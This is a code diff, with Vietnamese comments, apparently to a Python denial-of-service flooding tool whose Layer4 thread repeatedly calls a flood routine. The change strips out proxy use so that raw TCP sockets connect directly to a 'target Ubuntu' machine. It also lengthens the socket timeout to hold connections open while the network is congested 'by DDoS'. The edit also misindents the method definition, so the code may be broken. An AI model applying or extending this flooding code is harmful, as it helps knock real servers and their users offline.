@@ -483,17 +483,19 @@ class Layer4(Thread):
         while self._synevent.is_set():
             self.SENT_FLOOD()
 
-    def open_connection(self,
+   def open_connection(self,
                         conn_type=AF_INET,
                         sock_type=SOCK_STREAM,
                         proto_type=IPPROTO_TCP):
-        if self._proxies:
-            s = randchoice(self._proxies).open_socket(
-                conn_type, sock_type, proto_type)
-        else:
-            s = socket(conn_type, sock_type, proto_type)
+        # TUYỆT CHIÊU CUỐI: ÉP DÙNG SOCKET THUẦN, BỎ QUA BIẾN PROXY
+        s = socket(conn_type, sock_type, proto_type)
+        
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        s.settimeout(.9)
+        
+        # Tăng timeout lên 2-5 giây để duy trì kết nối khi mạng bị nghẽn (DDoS)
+        s.settimeout(2) 
+        
+        # Kết nối trực tiếp tới mục tiêu Ubuntu
         s.connect(self._target)
         return s
 
